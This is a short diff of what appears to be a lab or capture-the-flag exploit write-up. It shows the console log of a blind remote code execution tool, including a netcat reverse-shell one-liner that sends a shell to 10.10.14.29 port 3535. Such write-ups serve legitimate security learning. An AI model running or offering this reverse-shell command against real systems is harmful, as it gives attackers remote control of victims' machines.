@@ -59,7 +59,9 @@ $> ls
 [+] Triggering Remote code executin
 [*] Rember this is a blind RCE don't expect to see output
 {"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
+
 $> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 3535 > /tmp/f
+
 [+] Triggering Remote code executin
 [*] Rember this is a blind RCE don't expect to see output
 <html>
